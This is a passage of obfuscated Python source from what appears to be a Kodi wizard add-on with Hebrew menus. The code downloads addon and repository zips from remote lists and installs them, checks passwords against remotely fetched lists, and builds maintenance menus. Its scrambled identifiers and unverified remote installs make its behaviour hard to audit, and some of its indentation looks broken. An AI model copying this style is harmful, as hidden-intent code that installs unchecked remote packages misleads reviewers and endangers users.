		if OOO0OOO000O00000O ==True :#line:2511
			O00000OOOO0O0OOOO =wiz .openURL (OO00O00O00OOOOOO0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2512
			O00O0000OOO000OOO =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OOOOOOO00O000OOOO ).findall (O00000OOOO0O0OOOO )#line:2513
			if len (O00O0000OOO000OOO )>0 :#line:2514
				for OOO00OOO00O0OOO00 ,OO00O00O00OOOOOO0 ,O00O00O0OOO0O0000 ,OO0O0000000O0OOOO ,O0OOO0O0OOOOO0OOO ,OOOOO0OOO0O0000OO ,OOOOOOO0000OOOOO0 ,OO000O000OOO0OOO0 ,OO00O0O0OO000O0O0 in O00O0000OOO000OOO :#line:2515
					if os .path .exists (os .path .join (ADDONS ,OOOOOOO00O000OOOO )):#line:2516
						O0OO0OOOO00OO0O0O =['Launch Addon','Remove Addon']#line:2517
						O0000O0OOO0O0OO0O =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,O0OO0OOOO00OO0O0O )#line:2518
						if O0000O0OOO0O0OO0O ==0 :#line:2519
							wiz .ebi ('RunAddon(%s)'%OOOOOOO00O000OOOO )#line:2520
							xbmc .sleep (1000 )#line:2521
							return True #line:2522
						elif O0000O0OOO0O0OO0O ==1 :#line:2523
							wiz .cleanHouse (os .path .join (ADDONS ,OOOOOOO00O000OOOO ))#line:2524
							try :wiz .removeFolder (os .path .join (ADDONS ,OOOOOOO00O000OOOO ))#line:2525
							except :pass #line:2526
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOOOOOO00O000OOOO ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2527
								removeAddonData (OOOOOOO00O000OOOO )#line:2528
							wiz .refresh ()#line:2529
							return True #line:2530
						else :#line:2531
							return False #line:2532
					OO00OO0OO000OO00O =os .path .join (ADDONS ,O00O00O0OOO0O0000 )#line:2533
					if not O00O00O0OOO0O0000 .lower ()=='none'and not os .path .exists (OO00OO0OO000OO00O ):#line:2534
						wiz .log ("Repository not installed, installing it")#line:2535
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,OOOOOOO00O000OOOO ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O00O00O0OOO0O0000 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2536
							OOOO00O00OO0000O0 =wiz .parseDOM (wiz .openURL (OO0O0000000O0OOOO ),'addon',ret ='version',attrs ={'id':O00O00O0OOO0O0000 })#line:2537
							if len (OOOO00O00OO0000O0 )>0 :#line:2538
								OOO00OO0O0000OOO0 ='%s%s-%s.zip'%(O0OOO0O0OOOOO0OOO ,O00O00O0OOO0O0000 ,OOOO00O00OO0000O0 [0 ])#line:2539
								wiz .log (OOO00OO0O0000OOO0 )#line:2540
								if KODIV >=17 :wiz .addonDatabase (O00O00O0OOO0O0000 ,1 )#line:2541
								installAddon (O00O00O0OOO0O0000 ,OOO00OO0O0000OOO0 )#line:2542
								wiz .ebi ('UpdateAddonRepos()')#line:2543
								wiz .log ("Installing Addon from Kodi")#line:2545
								OO0OO00O00OOOOOOO =installFromKodi (OOOOOOO00O000OOOO )#line:2546
								wiz .log ("Install from Kodi: %s"%OO0OO00O00OOOOOOO )#line:2547
								if OO0OO00O00OOOOOOO :#line:2548
									wiz .refresh ()#line:2549
									return True #line:2550
							else :#line:2551
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O00O00O0OOO0O0000 )#line:2552
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(OOOOOOO00O000OOOO ,O00O00O0OOO0O0000 ))#line:2553
					elif O00O00O0OOO0O0000 .lower ()=='none':#line:2554
						wiz .log ("No repository, installing addon")#line:2555
						OOO00OO0OOOOOOO0O =OOOOOOO00O000OOOO #line:2556
						O000OOO0OO0OO00O0 =OO00O00O00OOOOOO0 #line:2557
						installAddon (OOOOOOO00O000OOOO ,OO00O00O00OOOOOO0 )#line:2558
						wiz .refresh ()#line:2559
						return True #line:2560
					else :#line:2561
						wiz .log ("Repository installed, installing addon")#line:2562
						OO0OO00O00OOOOOOO =installFromKodi (OOOOOOO00O000OOOO ,False )#line:2563
						if OO0OO00O00OOOOOOO :#line:2564
							wiz .refresh ()#line:2565
							return True #line:2566
					if os .path .exists (os .path .join (ADDONS ,OOOOOOO00O000OOOO )):return True #line:2567
					O00O00OO0OO0OO0OO =wiz .parseDOM (wiz .openURL (OO0O0000000O0OOOO ),'addon',ret ='version',attrs ={'id':OOOOOOO00O000OOOO })#line:2568
					if len (O00O00OO0OO0OO0OO )>0 :#line:2569
						OO00O00O00OOOOOO0 ="%s%s-%s.zip"%(OO00O00O00OOOOOO0 ,OOOOOOO00O000OOOO ,O00O00OO0OO0OO0OO [0 ])#line:2570
						wiz .log (str (OO00O00O00OOOOOO0 ))#line:2571
						if KODIV >=17 :wiz .addonDatabase (OOOOOOO00O000OOOO ,1 )#line:2572
						installAddon (OOOOOOO00O000OOOO ,OO00O00O00OOOOOO0 )#line:2573
						wiz .refresh ()#line:2574
					else :#line:2575
						wiz .log ("no match");return False #line:2576
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2577
		else :wiz .log ("[Addon Installer] Text File: %s"%OOO0OOO000O00000O )#line:2578
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2579
def installFromKodi (OO00OO0OO00OOO000 ,over =True ):#line:2581
	if over ==True :#line:2582
		xbmc .sleep (2000 )#line:2583
	wiz .ebi ('RunPlugin(plugin://%s)'%OO00OO0OO00OOO000 )#line:2585
	if not wiz .whileWindow ('yesnodialog'):#line:2586
		return False #line:2587
	xbmc .sleep (1000 )#line:2588
	if wiz .whileWindow ('okdialog'):#line:2589
		return False #line:2590
	wiz .whileWindow ('progressdialog')#line:2591
	if os .path .exists (os .path .join (ADDONS ,OO00OO0OO00OOO000 )):return True #line:2592
	else :return False #line:2593
def installAddon (O00O0000OOOOOO0O0 ,O0OO0OO00OO0O00O0 ):#line:2595
	if not wiz .workingURL (O0OO0OO00OO0O00O0 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O00O0000OOOOOO0O0 ,COLOR2 ));return #line:2596
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2597
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O0000OOOOOO0O0 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2598
	O00OO000O00OO000O =O0OO0OO00OO0O00O0 .split ('/')#line:2599
	O00OOO0OO00O0O00O =os .path .join (PACKAGES ,O00OO000O00OO000O [-1 ])#line:2600
	try :os .remove (O00OOO0OO00O0O00O )#line:2601
	except :pass #line:2602
	downloader .download (O0OO0OO00OO0O00O0 ,O00OOO0OO00O0O00O ,DP )#line:2603
	OOOOO0OOOO0000O00 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O0000OOOOOO0O0 )#line:2604
	DP .update (0 ,OOOOO0OOOO0000O00 ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2605
	O0O0O00OO00OO00O0 ,OO0OO000O0OOO00O0 ,O00OO0000O00OOOOO =extract .all (O00OOO0OO00O0O00O ,ADDONS ,DP ,title =OOOOO0OOOO0000O00 )#line:2606
	DP .update (0 ,OOOOO0OOOO0000O00 ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2607
	installed (O00O0000OOOOOO0O0 )#line:2608
	installDep (O00O0000OOOOOO0O0 ,DP )#line:2609
	DP .close ()#line:2610
	wiz .ebi ('UpdateAddonRepos()')#line:2611
	wiz .ebi ('UpdateLocalAddons()')#line:2612
	wiz .refresh ()#line:2613
def installDep (O0OO000O0OO000O0O ,DP =None ):#line:2615
	OO00OOO0000O0O0OO =os .path .join (ADDONS ,O0OO000O0OO000O0O ,'addon.xml')#line:2616
	if os .path .exists (OO00OOO0000O0O0OO ):#line:2617
		O00OO00OO0000000O =open (OO00OOO0000O0O0OO ,mode ='r');OO0O00O00OOO00O0O =O00OO00OO0000000O .read ();O00OO00OO0000000O .close ();#line:2618
		O0O0OOO0OOO000OO0 =wiz .parseDOM (OO0O00O00OOO00O0O ,'import',ret ='addon')#line:2619
		for O00OOO0O0OOOO00OO in O0O0OOO0OOO000OO0 :#line:2620
			if not 'xbmc.python'in O00OOO0O0OOOO00OO :#line:2621
				if not DP ==None :#line:2622
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,O00OOO0O0OOOO00OO ))#line:2623
				wiz .createTemp (O00OOO0O0OOOO00OO )#line:2624
def installed (O000O0OOOO000O000 ):#line:2651
	OOO0O0OO0OOOO0OOO =os .path .join (ADDONS ,O000O0OOOO000O000 ,'addon.xml')#line:2652
	if os .path .exists (OOO0O0OO0OOOO0OOO ):#line:2653
		try :#line:2654
			O0OOOOOOO00OOOOOO =open (OOO0O0OO0OOOO0OOO ,mode ='r');OO000OO0OO0O00O0O =O0OOOOOOO00OOOOOO .read ();O0OOOOOOO00OOOOOO .close ()#line:2655
			OO0OOOOOO0OOOO0O0 =wiz .parseDOM (OO000OO0OO0O00O0O ,'addon',ret ='name',attrs ={'id':O000O0OOOO000O000 })#line:2656
			OOO000OOO000O0O0O =os .path .join (ADDONS ,O000O0OOOO000O000 ,'icon.png')#line:2657
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0OOOOOO0OOOO0O0 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OOO000OOO000O0O0O )#line:2658
		except :pass #line:2659
def youtubeMenu (url =None ):#line:2661
	if not YOUTUBEFILE =='http://':#line:2662
		if url ==None :#line:2663
			O0OO0O0OOO0O0O0OO =wiz .workingURL (YOUTUBEFILE )#line:2664
			O00OOOOO0OO000000 =uservar .YOUTUBEFILE #line:2665
		else :#line:2666
			O0OO0O0OOO0O0O0OO =wiz .workingURL (url )#line:2667
			O00OOOOO0OO000000 =url #line:2668
		if O0OO0O0OOO0O0O0OO ==True :#line:2669
			O0O0OOOO00OOO0000 =wiz .openURL (O00OOOOO0OO000000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2670
			O0O0OO00000OO000O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0O0OOOO00OOO0000 )#line:2671
			if len (O0O0OO00000OO000O )>0 :#line:2672
				for O0OO0O000O000OOOO ,O0000OO000OOO0OOO ,url ,OOO00OO0OO0O00O0O ,OOO0000OO0OOO0000 ,O0O0000O0OO00O00O in O0O0OO00000OO000O :#line:2673
					if O0000OO000OOO0OOO .lower ()=="yes":#line:2674
						addDir ("[B]%s[/B]"%O0OO0O000O000OOOO ,'youtube',url ,description =O0O0000O0OO00O00O ,icon =OOO00OO0OO0O00O0O ,fanart =OOO0000OO0OOO0000 ,themeit =THEME3 )#line:2675
					else :#line:2676
						addFile (O0OO0O000O000OOOO ,'viewVideo',url =url ,description =O0O0000O0OO00O00O ,icon =OOO00OO0OO0O00O0O ,fanart =OOO0000OO0OOO0000 ,themeit =THEME2 )#line:2677
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2678
		else :#line:2679
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2680
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2681
			addFile ('%s'%O0OO0O0OOO0O0O0OO ,'',themeit =THEME3 )#line:2682
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2683
	setView ('files','viewType')#line:2684
def STARTP ():#line:2685
	OOOOOOO000OO0OO00 =(ADDON .getSetting ("pass"))#line:2686
	if BUILDNAME =="":#line:2687
	 if not NOTIFY =='true':#line:2688
          OOO0OO0OOO0000O0O =wiz .workingURL (NOTIFICATION )#line:2689
	 if not NOTIFY2 =='true':#line:2690
          OOO0OO0OOO0000O0O =wiz .workingURL (NOTIFICATION2 )#line:2691
	 if not NOTIFY3 =='true':#line:2692
          OOO0OO0OOO0000O0O =wiz .workingURL (NOTIFICATION3 )#line:2693
	OO0O0OOOOOOO0O00O =OOOOOOO000OO0OO00 #line:2694
	OOO0OO0OOO0000O0O =urllib2 .Request (SPEED )#line:2695
	OO0O0000OO0O000O0 =urllib2 .urlopen (OOO0OO0OOO0000O0O )#line:2696
	O00O0O0O0OOOO0OOO =OO0O0000OO0O000O0 .readlines ()#line:2698
	O0O00O0O000OO0O00 =0 #line:2702
	for OO000O0000O0OO000 in O00O0O0O0OOOO0OOO :#line:2703
		if OO000O0000O0OO000 .split (' ==')[0 ]==OOOOOOO000OO0OO00 or OO000O0000O0OO000 .split ()[0 ]==OOOOOOO000OO0OO00 :#line:2704
			O0O00O0O000OO0O00 =1 #line:2705
			break #line:2706
	if O0O00O0O000OO0O00 ==0 :#line:2707
					OO00O0OOO0OOO0O0O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2708
					if OO00O0OOO0OOO0O0O :#line:2710
						ADDON .openSettings ()#line:2712
						sys .exit ()#line:2714
					else :#line:2715
						sys .exit ()#line:2716
	return 'ok'#line:2720
def STARTP2 ():#line:2721
	O000O0O0000OO0O00 =(ADDON .getSetting ("user"))#line:2722
	O00O0000O00O0O000 =(UNAME )#line:2724
	O0OO0000O00OOOOO0 =urllib2 .urlopen (O00O0000O00O0O000 )#line:2725
	OOO000O000O00OO00 =O0OO0000O00OOOOO0 .readlines ()#line:2726
	OOO0O0000O00O0O0O =0 #line:2727
	for O0O0OO0O0O0O000OO in OOO000O000O00OO00 :#line:2730
		if O0O0OO0O0O0O000OO .split (' ==')[0 ]==O000O0O0000OO0O00 or O0O0OO0O0O0O000OO .split ()[0 ]==O000O0O0000OO0O00 :#line:2731
			OOO0O0000O00O0O0O =1 #line:2732
			break #line:2733
	if OOO0O0000O00O0O0O ==0 :#line:2734
		O0O0000OOO000O0O0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2735
		if O0O0000OOO000O0O0 :#line:2737
			ADDON .openSettings ()#line:2739
			sys .exit ()#line:2742
		else :#line:2743
			sys .exit ()#line:2744
	return 'ok'#line:2748
def passandpin ():#line:2749
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2750
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2751
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2752
def passandUsername ():#line:2753
	ADDON .openSettings ()#line:2754
def folderback ():#line:2757
    OO0OOO000OOO0O00O =ADDON .getSetting ("path")#line:2758
    if OO0OOO000OOO0O00O :#line:2759
      OO0OOO000OOO0O00O =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2760
      ADDON .setSetting ("path",OO0OOO000OOO0O00O )#line:2761
def backmyupbuild ():#line:2764
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2768
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2769
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2770
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2772
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2773
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2774
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2776
def maintMenu (view =None ):#line:2780
	O0O00OOO0O000O000 ='[B][COLOR green]ON[/COLOR][/B]';OO00000000OOO0O0O ='[B][COLOR red]OFF[/COLOR][/B]'#line:2782
	OOO00OOO000O0OOO0 ='true'if AUTOCLEANUP =='true'else 'false'#line:2783
	OOOOO0O0000OOO0OO ='true'if AUTOCACHE =='true'else 'false'#line:2784
	OO000O0O0OO000000 ='true'if AUTOPACKAGES =='true'else 'false'#line:2785
	O00O00OOOOOOO00O0 ='true'if AUTOTHUMBS =='true'else 'false'#line:2786
	OO0O000OO00O00O0O ='true'if SHOWMAINT =='true'else 'false'#line:2787
	OO0OOO0O0O0O00OO0 ='true'if INCLUDEVIDEO =='true'else 'false'#line:2788
	OO0OO00OOOOO0O000 ='true'if INCLUDEALL =='true'else 'false'#line:2789
	O000OO0O000OO00OO ='true'if THIRDPARTY =='true'else 'false'#line:2790
	if wiz .Grab_Log (True )==False :OOOOOOO0OO000O00O =0 #line:2791
	else :OOOOOOO0OO000O00O =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2792
	if wiz .Grab_Log (True ,True )==False :O0OOOO0O0O0O0O000 =0 #line:2793
	else :O0OOOO0O0O0O0O000 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2794
	O0OO000OO0O0OOO00 =int (OOOOOOO0OO000O00O )+int (O0OOOO0O0O0O0O000 )#line:2795
	O0O0OOOO00O0O0O00 =str (O0OO000OO0O0OOO00 )+' Error(s) Found'if O0OO000OO0O0OOO00 >0 else 'None Found'#line:2796
	OO0O00OOOO0O0OO0O =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2797
	if OO0OO00OOOOO0O000 =='true':#line:2798
		O00000O0OOO0OOO00 ='true'#line:2799
		OO00OOO0OOOOO00OO ='true'#line:2800
		O00O00000OOO0O0O0 ='true'#line:2801
		OO0O000000O00000O ='true'#line:2802
		O0OOOOO00O0O000OO ='true'#line:2803
		OO0000OOOO00O00O0 ='true'#line:2804
		OOO0OO000OO00O0O0 ='true'#line:2805
		O0OO0O00O0OO0000O ='true'#line:2806
	else :#line:2807
		O00000O0OOO0OOO00 ='true'if INCLUDEBOB =='true'else 'false'#line:2808
		OO00OOO0OOOOO00OO ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2809
		O00O00000OOO0O0O0 ='true'if INCLUDESPECTO =='true'else 'false'#line:2810
		OO0O000000O00000O ='true'if INCLUDEGENESIS =='true'else 'false'#line:2811
		O0OOOOO00O0O000OO ='true'if INCLUDEEXODUS =='true'else 'false'#line:2812
		OO0000OOOO00O00O0 ='true'if INCLUDEONECHAN =='true'else 'false'#line:2813
		OOO0OO000OO00O0O0 ='true'if INCLUDESALTS =='true'else 'false'#line:2814
		O0OO0O00O0OO0000O ='true'if INCLUDESALTSHD =='true'else 'false'#line:2815
	OO0O0000O00O00O00 =wiz .getSize (PACKAGES )#line:2816
	O0O0O00O00OOOOOOO =wiz .getSize (THUMBS )#line:2817
	OOOOO0O0OO0O00OOO =wiz .getCacheSize ()#line:2818
	O0OO0O0OO0000OO0O =OO0O0000O00O00O00 +O0O0O00O00OOOOOOO +OOOOO0O0OO0O00OOO #line:2819
	O00OO00O00OO0OOO0 =['Daily','Always','3 Days','Weekly']#line:2820
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2821
	if view =="clean"or SHOWMAINT =='true':#line:2822
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0OO0O0OO0000OO0O ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2823
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOOOO0O0OO0O00OOO ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2824
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0O0000O00O00O00 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2825
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0O0O00O00OOOOOOO ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2826
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2827
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2828
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2829
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2830
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2831
	if view =="addon"or SHOWMAINT =='false':#line:2832
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2833
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2834
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2835
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2836
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2837
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2838
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2839
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2840
	if view =="misc"or SHOWMAINT =='true':#line:2841
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2842
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2843
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2844
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2845
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2846
		addFile ('View Errors in Log: %s'%(O0O0OOOO00O0O0O00 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2847
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2848
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2849
		addFile ('Clear Wizard Log File%s'%OO0O00OOOO0O0OO0O ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2850
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2851
	if view =="backup"or SHOWMAINT =='true':#line:2852
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2853
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2854
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2855
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2856
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2857
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2858
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2859
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2860
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2861
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2862
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2863
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2864
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2865
	if view =="tweaks"or SHOWMAINT =='true':#line:2866
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2867
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2868
		else :#line:2869
			if os .path .exists (ADVANCED ):#line:2870
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2871
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2872
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2873
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2874
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2875
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2876
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2877
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2878
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2879
	addFile ('Show All Maintenance: %s'%OO0O000OO00O00O0O .replace ('true',O0O00OOO0O000O000 ).replace ('false',OO00000000OOO0O0O ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2880
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2881
	addFile ('Third Party Wizards: %s'%O000OO0O000OO00OO .replace ('true',O0O00OOO0O000O000 ).replace ('false',OO00000000OOO0O0O ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2882
	if O000OO0O000OO00OO =='true':#line:2883
		OO0O0O0O00O0000O0 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2884
		O000OOOOO0OO0O000 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2885
		OO0O0O0O000O000O0 =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2886
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0O0O0O00O0000O0 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2887
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O000OOOOO0OO0O000 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2888
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0O0O0O000O000O0 ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2889
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2890
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OOO00OOO000O0OOO0 .replace ('true',O0O00OOO0O000O000 ).replace ('false',OO00000000OOO0O0O ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2891
	if OOO00OOO000O0OOO0 =='true':#line:2892
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%O00OO00O00OO0OOO0 [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2893
		addFile ('--- ניקוי קאש בהפעלה: %s'%OOOOO0O0000OOO0OO .replace ('true',O0O00OOO0O000O000 ).replace ('false',OO00000000OOO0O0O ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2894
		addFile ('--- ניקוי חבילות בהפעלה: %s'%OO000O0O0OO000000 .replace ('true',O0O00OOO0O000O000 ).replace ('false',OO00000000OOO0O0O ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2895
